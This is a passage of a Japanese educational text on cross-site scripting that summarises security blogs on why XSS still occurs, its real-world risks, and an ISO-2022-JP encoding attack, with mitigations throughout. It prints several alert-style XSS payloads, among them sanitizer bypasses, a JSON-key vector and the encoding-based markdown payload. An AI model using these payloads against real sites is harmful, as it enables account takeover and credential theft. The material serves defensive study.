バグバウンティの実務においては、脆弱性の**存在証明（Proof of Concept）**として `alert(document.domain)` を示すだけで十分なケースも多いが、深刻度評価やバウンティ額の交渉においては、**「その脆弱性が実際に何を可能にするか」を具体的なシナリオとコードで示せるかどうか**が決定的な差を生む。本セクションで見た4分類（リフレクテッド／ストアド／DOM／ブラインド）はそれぞれ検出の勘所と悪用の型が異なり、CSRFとの連鎖、iframeによる被害者の隔離、画像タグを使ったCORS制限の実質的な回避といった具体的技法は、後続の章（特に第4〜5章で扱うCSP回避やプロトタイプ汚染、DOM Clobbering）でも繰り返し姿を変えて登場する基礎になっている。

## 日本語基礎資料（なぜXSSは生まれるか / リスク / 徳丸）

XSS（クロスサイト・スクリプティング）は、Web脆弱性の中でもっとも古くからある部類に入る。にもかかわらず、なぜ2020年代の今も現役の脅威であり続けるのか。本節では、日本語圏で発信されている一次資料——GMO Flatt Securityのブログと、日本のWebセキュリティ研究者・徳丸浩氏のブログ——を軸に、「発生原因の分類」「被害の実務的なシナリオ」「文字エンコーディングという盲点」という3つの角度からXSSの原理を掘り下げる。英語圏の解説書はペイロードのバリエーションに強い一方、こうした日本語資料は「なぜ現場のコードでXSSが今なお混入するのか」という開発プロセス寄りの分析に強みがある。

### なぜいまだにXSSは生まれてしまうのか

まず押さえておきたいのは、XSSが「昔からある単純なバグ」ではなく、統計上も今なお主要な脆弱性であり続けているという事実である。CWE Top 25（脆弱性の種類別ランキング）のアーカイブでは、2020年から2024年にかけてXSSは常に1位または2位に位置している。バグバウンティプラットフォームHackerOneの集計でも、全業種を通じて報告される脆弱性のおよそ20%をXSSが占める。GMO Flatt Securityが実施する診断サービスの内部データでも、認証・認可の不備に次いで3番目に多く発見される脆弱性がXSSだという。

> 出典: なぜいまだにXSSは生まれてしまうのか — https://blog.flatt.tech/entry/still_xss

これほど長く研究され、React・Vue・Angularのようなモダンフレームワークが軒並み自動エスケープ機構を備えているにもかかわらず、なぜXSSは減らないのか。Flattのブログは、その理由を「フレームワークが守ってくれる範囲」と「実際にコードが値を出力する場所（シンク）」の間にあるギャップとして整理している。以下、その分類を原理レベルで見ていく。

#### 原因1: シンクの多様性 — フレームワークの守備範囲は思ったより狭い

Reactやテンプレートエンジンの多くが自動的にエスケープしてくれるのは、基本的に「HTML本文へのテキスト出力」と「HTML属性（URLを除く）」の2種類だけである。ところが実際のアプリケーションでは、ユーザー入力が次のような場所に流れ込むことがある。

- **URLを受け取るHTML属性**: `<a href="${userInput}">` のような形。ここに `javascript:alert(1)` のようなスキームを注入されると、HTMLエスケープ自体は正しく行われていても実行される。`"` や `<` を全部エスケープしても、`javascript:` というスキーム文字列自体はエスケープの対象にならないからだ。
- **JavaScriptコード内のURL代入**: `window.location.href = userInput` のように、DOM API へ直接値を渡すコード。HTMLエスケープの出番自体がない。
- **文字列結合による関数構築**: `eval('var data = "' + userInput + '";')` のように、実行対象のコード自体を文字列結合で組み立てるパターン。ここでは「HTMLの構文」ではなく「JavaScriptの構文」が壊れるため、HTML用のエスケープ関数は無力である。

これらはいずれも、「テンプレートエンジンやフレームワークが自動でエスケープしてくれる出力経路」の外側にある。つまりXSS対策の話を「エスケープすれば安全」という一言で済ませてしまうと、これらのシンクが抜け落ちる。

#### 原因2: フレームワークの防御機構そのものの限界

自動エスケープ機構があっても、開発者がそれを迂回する場面は必ず生まれる。典型例がリッチテキストエディタやMarkdownレンダリングで、ユーザーが入力したHTMLをそのままDOMに挿入する必要がある機能だ。ここでは「エスケープしない」ことが機能要件そのものなので、フレームワークの自動防御は最初から効かない。

もう一つ興味深い実例が、値の「型」に対する開発者の思い込みを突いたケースである。CVE-2021-20323として報告された脆弱性では、JSONのフィールド名（キー）がXSSの発火点になった。

```json
{"<img onerror=confirm('xss_poc') src/>":1}
```

多くの開発者は「JSONの値」はエスケープするが、「JSONのキー」はシステム内部の識別子であって外部由来ではない、あるいは危険な文字列にはなり得ないと思い込みがちである。しかしキーも自由な文字列であり、それがそのままHTMLとして描画される実装であれば、通常の入力値と同じくXSSベクトルになる。

自作のHTMLサニタイザー（危険なタグ・属性を除去する自前フィルタ）も繰り返しバイパスされてきた。HackerOneレポート1675516で報告された例では、ブラウザのHTML解析の「寛容さ」——文法的に厳密でない入れ子や欠落したタグでもできる限り解釈しようとする挙動——を突いて、フィルタを通過する文字列が組み立てられた。

```html
<p><p><p><audio/src/onerror=alert(document.domain)>
```

一見するとネストされた`<p>`タグの羅列に見えるが、ブラウザのHTMLパーサーは不正な構造でも解析を続行しようとするため、フィルタ側のパターンマッチングでは想定していなかった構文の組み合わせで`<audio>`要素の`onerror`ハンドラが生き残ってしまう。

さらに厄介なのが、業界標準のサニタイザーであるDOMPurifyを正しく使っていても、その**出力結果に対して後から文字列操作を加える**ことで安全性が破壊されるパターンである。

```javascript
data = DOMPurify.sanitize(userInput);
data = data.replace(/class=".*?"/, 'class="custom-class" ');
document.body.innerHTML = data;
```

DOMPurifyは`userInput`を安全な形に浄化するが、その後の`replace()`が正規表現で`class="..."`を検出して置換する際、ユーザー入力に含まれていた `class=" <div id="<img src onerror=alert(1)>">` のような文字列によって、正規表現のマッチ範囲がずれ、サニタイズ済みのはずの構造に新しい属性・要素を注入されてしまう。**サニタイズ後の文字列に手を加えた瞬間、サニタイザーが保証していた安全性は失われる**という、非常に重要な設計原則がここから読み取れる。

#### 原因3: フレームワーク機構の不適切な使用

フレームワーク自体は安全なAPIを提供していても、開発者がそれを誤って使えば意味がない。HackerOneレポート243363で報告された例では、jQueryを使ったコードで次のような実装が見られた。

```javascript
const msg = window.location.search.match(/[&?]msg=([^&]+)/);
$(document.body).html(Utils.infoMessage(msgText)); // 本来 .text() を使うべき場面
```

jQueryには文字列を「HTMLとして解釈して挿入する」`.html()`と、「テキストとしてエスケープして挿入する」`.text()`という2つのAPIが用意されている。ここでは表示したいのは単なるメッセージ文字列であり`.text()`を使うべきだったが、`.html()`が選ばれたためにURLのクエリパラメータが直接HTMLとして解釈されXSSが成立した。フレームワークが安全なAPIを提供していることと、開発者がそれを正しく選択することは別問題である。

#### 原因4: フレームワークの守備範囲外にあるシンク

`postMessage`のようなウィンドウ間通信や、リダイレクト処理、動的なJavaScript生成といった機構も、テンプレートエンジンの自動エスケープが届かない領域である。

HackerOneレポート1379400では、`postMessage`で受け取ったデータをHTML属性に埋め込む処理で問題が起きた。

```javascript
const snippetLink = `<a href="/snippet/${message.snippetId}/${
  encodeURIComponent(message.snippetName)
}">${escapeHTML(message.snippetName)}</a>`;
```

一見、`escapeHTML()`と`encodeURIComponent()`をそれぞれ適切に使い分けているように見えるが、テンプレートリテラルによる手組みのHTML構築自体が、コンテキストごとに正しいエスケープ関数を都度選び続けることを開発者に要求する。1箇所でも見落とせば脆弱性になる、この「都度手動」の構造そのものがリスクである。

HackerOneレポート2611305では、ログイン成功後の自動リダイレクト処理が悪用された。認証済みセッションの状態でリダイレクト先URLを制御できると、通常のオープンリダイレクトより深刻な形で悪用されうる。HackerOneレポート2670521では、検索クエリの値がそのまま動的スクリプト生成に使われ、`'};alert('XSS');var x={y:'`という入力でスクリプトの構文そのものが乗っ取られた。

#### 原因5: ライブラリの誤用・ドキュメント不読

Markdownパーサーの`marked`は、README上で「出力されるHTMLをサニタイズしない」ことを明記している。つまり`marked`だけでユーザー入力のMarkdownをレンダリングすると、その時点でXSSに対して無防備になる。ツールチップライブラリ`Tippy.js`もHTMLをコンテンツとして扱うには`allowHTML`オプションを明示的に有効化する必要があり、この設定がユーザー入力の危険性を意識せず有効化されるケースがある。EJSテンプレートでは`<%= value %>`（エスケープあり）と`<%- value %>`（エスケープなし）が視覚的にほぼ区別できず、コードレビューでの見落としを誘発する。

#### 多層防御（CSP・Trusted Types・WAF）の限界

これらの「根本原因」に対して、CSP（Content Security Policy）、Trusted Types、WAF（Web Application Firewall）といった多層防御の仕組みが対策として語られることが多い。しかしFlattのブログは、これらを「根本対策ではなくリスク低減策」だと明確に位置づけている。

CSPは継続的にバイパス手法が発見されており、React v19で`javascript:`スキームのリンクが無効化されるなど個々の改善はあるものの、HTTP Archiveの分析（HTTP Almanac）ではCSPを設定しているサイトの91%が`unsafe-inline`ディレクティブを含んでいるという報告がある。`unsafe-inline`が指定された時点で、インラインスクリプトの実行制限というCSPの主要な防御機能は事実上無効化される。

Trusted Types（DOM XSSのシンクに渡す値の型を制限するブラウザAPI）はChromium系ブラウザのみの対応であり、バイパス手法をまとめた「Cursed Types」のようなリポジトリも存在する。WAFについてもOWASP自身がその信頼性に疑問を呈しており、シグネチャベースの検知をすり抜けるペイロードの作成は攻撃者にとって常に可能である。

#### 対策のまとめ

Flattのブログが示す対策は次のように整理できる。

1. すべての入力値を疑う（プログラムが複雑化した現代では「この値は安全」という個別判断はほぼ不可能）
2. 自作サニタイザーではなくDOMPurifyのような実績あるOSSを使い、その出力に後から手を加えない
3. フレームワークが提供する機構（`.text()`と`.html()`の違いなど）を正確に理解して使う
4. URLを受け取る箇所では`javascript:`のような危険なスキームを検査・除外する
5. 文字列結合による動的スクリプト生成を避ける
6. 使用ライブラリのドキュメントをセキュリティ関連キーワードで検索し、サニタイズの有無を確認する
7. CodeQLやSemgrepのような静的解析ツールでシンクを機械的に検出する
8. WYSIWYGエディタなど信頼できない処理はiframeでサンドボックス化する
9. CSP・WAFは補助的な多層防御として使い、根本対策の代替にしない

### XSSの発生原理以外の話 — リスクの実務的な姿

XSSの解説はしばしば「アラートダイアログを表示できました」で終わってしまうが、実際の攻撃者はそこで満足しない。GMO Flatt Securityの別記事は、XSS（特にStored XSS、すなわちサーバー側に永続保存された悪意あるスクリプトが他ユーザーの閲覧時に実行される蓄積型のXSS）が実務上どのような被害に発展するかを4つのシナリオで具体化している。

> 出典: XSSの発生原理以外の話 — https://blog.flatt.tech/entry/xss_risk

#### シナリオ1: 認証情報（Cookie）の奪取

もっとも古典的なシナリオである。攻撃者はXSSを通じてJavaScriptを注入し、被害者のブラウザ上でCookieを読み取って攻撃者のサーバーに送信させる。Cookieに`HttpOnly`属性が付与されていない場合、`document.cookie`でJavaScriptから読み取れてしまうため、セッションを乗っ取られてアカウントを完全に掌握される。標的が管理者アカウントであれば、被害はサービス全体に及ぶ。

#### シナリオ2: 偽ログインページとキーロガー

XSSで表示中のページの上に偽のログインフォームを重ねて表示させ、入力されたキー操作をリアルタイムで攻撃者のサーバーに送信する。ユーザーは正規のドメイン上で操作していると信じ込んでいるため、フィッシングメールのような「怪しいURL」への警戒心が働かない。決済画面などで実行されると、クレジットカード情報のような機微情報がその場で盗聴される。

#### シナリオ3: 自動フィルイン機能を悪用した認証情報の窃取

ブラウザやパスワードマネージャーの「自動入力」機能は、保存済みの認証情報を**そのドメインの正規のフォームにのみ**自動入力する設計になっている。攻撃者はXSSを使って正規ドメイン上に見た目だけの偽フォームを重ねて表示させ、この自動入力機能を逆手に取ってメールアドレスやパスワードを自動的に入力させ、その値をJavaScriptで読み取って外部に送信する。ユーザーは何も手入力していないため、被害に気づく手がかりがほぼない。

対策として、GoogleやMicrosoftはログイン処理専用のサブドメインを、メインのアプリケーションドメインから意図的に分離している。仮にメインドメインでXSSが発生しても、認証フォーム自体が別ドメインに存在すれば、ブラウザの自動入力機能はそのドメインの認証情報を提供しないため、この攻撃経路が構造的に遮断される。

#### シナリオ4: Service Worker経由の継続的な攻撃

前述の3つのシナリオと決定的に異なるのが、この4つ目である。XSSを使ってブラウザにService Worker（バックグラウンドで動作し続けるスクリプトで、オフラインキャッシュやプッシュ通知などに使われる機構）を登録させると、攻撃者はそれ以降、被害者がそのオリジンにアクセスするたびに情報を継続的に取得し続けられる。重要なのは、**元となったXSSの脆弱性そのものを修正しても、既に登録されたService Workerはブラウザに残り続け、攻撃が継続する**という点である。つまりXSSの被害範囲は「脆弱性が存在する期間」に限定されず、修正後にも及び得る。

Flattのブログはこうしたツールについて、「XSS用のキーロガーや偽ログイン画面を簡単に作成するツール、多くの悪意のあるスクリプトがインターネット上に存在する」と指摘しており、攻撃の実行に高度な技術力が必要ないことが被害拡大の一因になっていると述べている。

#### 結論: 「アラートが出せた」から「実害シナリオ」への認識転換

この記事全体を貫くメッセージは、XSSの深刻度を「`alert(1)`が実行できるかどうか」で判断するのではなく、上記のような実務的な被害シナリオに接続して評価すべきだ、という点にある。バグバウンティやセキュリティ診断の報告書でXSSの深刻度を過小評価しないためにも、この視点は重要である。

### 徳丸浩ブログに見る文字エンコーディングという盲点

日本語圏のWebセキュリティ研究の第一人者である徳丸浩氏のブログには、XSS関連の分析記事が継続的に掲載されている。ブログ全体の索引としては次のような記事が確認できる。

- ISO-2022-JP自動判定を用いたHTMLコンテキスト破壊によるXSS（2025年1月）
- ISO-2022-JPの自動判定によるクロスサイト・スクリプティング（2024年12月）
- クリックジャッキング未対策サイトの被害条件（2023年4月）
- SPAセキュリティ超入門（2022年9月、XSSを含むSPA特有のセキュリティ論点）

> 出典: 徳丸浩のブログ（索引） — https://blog.tokumaru.org/

このうち、原理的に特に重要なのがISO-2022-JPを使った攻撃である。以下で仕組みを詳しく見る。

#### ISO-2022-JPの自動判定によるHTMLコンテキスト破壊

前提として、HTMLはブラウザに解釈される前に、まず「どの文字エンコーディングで書かれたバイト列なのか」が確定していなければならない。`<meta charset="UTF-8">`のような指定が明示されていれば話は単純だが、指定が欠落している、あるいは複数の候補があいまいな場合、ブラウザは**バイト列の内容そのものから**エンコーディングを推測する「自動判定」を行うことがある。この自動判定こそが攻撃の足がかりになる。

ISO-2022-JPは、日本語の文字集合を切り替えるために「エスケープシーケンス」と呼ばれる特殊なバイト列を使う古い日本語エンコーディングである。たとえば`ESC $ @`（バイト列としては`0x1B 0x24 0x40`）は「ここから2バイト文字であるJIS X 0208の領域が始まる」ことを、`ESC ( B`（`0x1B 0x28 0x42`）は「ここからASCII領域に戻る」ことを意味する制御シーケンスだ。

この攻撃の要点は、**ASCIIの範囲に収まる`"`（ダブルクォート、`0x22`）という1バイトが、ISO-2022-JPとして解釈された場合には「2バイト文字を構成する一部のデータ」として扱われ、区切り文字として機能しなくなる**という性質にある。

具体的なペイロードは次のようなものである（Markdown記法の画像タグを経由してHTMLに変換されるアプリケーションを想定）。

```
![%1b$@](BBB)%1b(B![DDD](+onerror=alert`1`+)
```

これがサーバー側でMarkdownからHTMLへ変換されると、次のようなHTMLになる。

```html
<img src="BBB" alt="⊂<img src=" onerror=alert`1` " alt="DDD">
```

攻撃の流れを整理すると次のようになる。

1. `%1b$@`（URLデコードすると`ESC $ @`）を`alt`属性の値の中に混入させる。これはISO-2022-JPにおいて「以降を2バイト文字（JIS X 0208）として解釈せよ」という指示である。
2. このエスケープシーケンスの直後に来る、本来は属性値を閉じるはずの`"`が、2バイト文字を構成するデータバイトとして解釈されてしまい、区切り文字としての意味を失う。
3. `%1b(B`（`ESC ( B`）で「ASCII領域への復帰」を指示する。これでブラウザの解釈は再びASCII（1バイト文字）に戻る。
4. 復帰後の位置に`onerror=alert`1``という文字列を配置する。ASCII領域に戻っているためこの部分は通常のHTML属性として解釈され、直前で破壊された引用符の構造と組み合わさることで、`<img>`要素に新しい`onerror`イベントハンドラ属性が追加されてしまう。バッククォートによるタグ付きテンプレート構文が使われているのは、ダブルクォートやシングルクォートを追加で使わずに関数呼び出しの引数を渡すためである。

なぜこの攻撃がサーバー側のエスケープをすり抜けるのか。サーバー側のコードは典型的には次のような処理をしている。

```php
$html = preg_replace('/!\[(.*?)\]\((.*?)\)/', 
    '<img src="\2" alt="\1">',
    htmlspecialchars($md));
```

`htmlspecialchars()`は`<`・`>`・`&`・`"`のようなHTMLの構文上重要なASCII文字をエスケープする関数である。しかしISO-2022-JPのエスケープシーケンス（`0x1B`から始まるバイト列）自体は、これらの文字とは無関係の制御コードであり、`htmlspecialchars()`のエスケープ対象には最初から含まれていない。つまり**サーバー側のエスケープ処理は完璧に動作しているにもかかわらず**、後段でブラウザが行う文字エンコーディングの自動判定という、サーバー側からは制御できない解釈レイヤーによってHTML構造そのものが書き換えられてしまう。これが「HTMLコンテキストの破壊」という表現の意味するところである。

対策は単純かつ本質的である。徳丸氏のブログは「ウェブコンテンツの文字エンコーディングを適切に設定する」ことを唯一にして最も有効な対策として挙げている。具体的には`<meta charset="UTF-8">`のようなHTML内での明示、または`Content-Type: text/html; charset=UTF-8`というHTTPレスポンスヘッダーでの明示のいずれか（望ましくは両方）を行うことで、ブラウザが自動判定に頼る余地自体をなくしてしまう。これは「文字エンコーディングを明示する」という、XSS対策以前からの古典的なベストプラクティスがそのままXSS対策としても機能するという好例である。

ただし記事はこの攻撃の実用上の限界にも触れている。実際のMarkdownパーサーの多くは括弧の対応関係をきちんと検証する実装になっているため、この攻撃が成立する条件はかなり限定的であり、「わざとらしいCTFのような状況でしか再現しなさそう」という評価が下されている。とはいえ、この事例が示す教訓——**入力側のエスケープが正しくても、出力側の解釈レイヤー（この場合はブラウザの文字コード自動判定）が想定外の挙動をすればHTML構造は壊れうる**——は、他の文字エンコーディング関連の脆弱性（UTF-7を使った古典的なXSSや、Shift_JISの0x5C問題など）にも共通する普遍的な原理であり、学習価値が高い。

> 出典: ISO-2022-JPによるXSS — https://blog.tokumaru.org/2025/01/breaking-html-context-xss-by-iso-2022-jp.html

#### エラーメッセージ経由のXSS — 「内部情報だから安全」という誤解

徳丸ブログでは、エラーメッセージがそのままXSSの発火点になった実例も紹介されている。PHP・PDO・PostgreSQLという構成で、整数値を期待するidパラメータに`<script>alert(1)</script>`のような文字列を入力すると、型変換に失敗した際のデータベースエラーメッセージがエスケープなしでそのまま画面に出力され、注入したスクリプトが実行されるというものである。実際に出力されるエラーメッセージは次のような形になる。

```
invalid input syntax for integer: "<script>alert(1)</script>"
```

このケースは、開発者が「エラーメッセージはシステム内部の情報であり、ユーザーが直接コントロールできる文字列ではない」と誤解しやすい典型例である。しかし実際には、エラーメッセージの文面には元の入力値がそのまま埋め込まれることが多く、その入力値を攻撃者が完全にコントロールできる以上、通常のユーザー入力とまったく同じ危険性を持つ。

対策は二段構えで示されている。第一に、そもそも「システム内部的なエラー内容は画面に表示すべきではない」という原則に立ち返り、詳細なエラー情報はログファイルへの出力にとどめるべきである。第二に、やむを得ず画面にエラー情報を表示する必要がある場合には、`htmlspecialchars($e->getMessage(), ENT_QUOTES, 'UTF-8')`のように、他の出力箇所と同様にHTMLエスケープを必ず適用しなければならない。

記事はさらに、Google検索で見つかるサンプルコードの多くがこのエスケープを欠いたまま「動くコード例」として紹介されている現状に警鐘を鳴らしている。初学者がこうしたサンプルを「正しい書き方」として学習し、そのまま製品コードに持ち込んでしまう危険性を指摘しており、セキュアなコード例を発信する側の責任という、教育的な観点からの問題提起になっている。

> 出典: エラーメッセージによるXSS — https://blog.tokumaru.org/2015/05/xss.html

### まとめ

本節で見た3つの資料は、それぞれ異なる角度からXSSの「今なお解決されない理由」を照らしている。Flattの2記事は、モダンなフレームワークが普及した現在でも、シンクの多様性・サニタイザーの誤用・ライブラリの隠れた仕様・多層防御の限界という構造的な要因によってXSSが生まれ続けることを示し、さらに「アラートが出るかどうか」ではなく認証情報窃取やService Worker経由の継続攻撃といった実害シナリオでリスクを評価すべきだと説く。徳丸ブログの分析は、サーバー側のエスケープ処理が教科書通りに正しくても、文字エンコーディングの自動判定というブラウザ側の解釈レイヤーによってHTML構造そのものが破壊されうるという、より根源的な原理を示している。これらはいずれも、「エスケープすればXSSは防げる」という単純化された理解の限界を突いており、本書全体を通じて繰り返し立ち返るべき視点である。
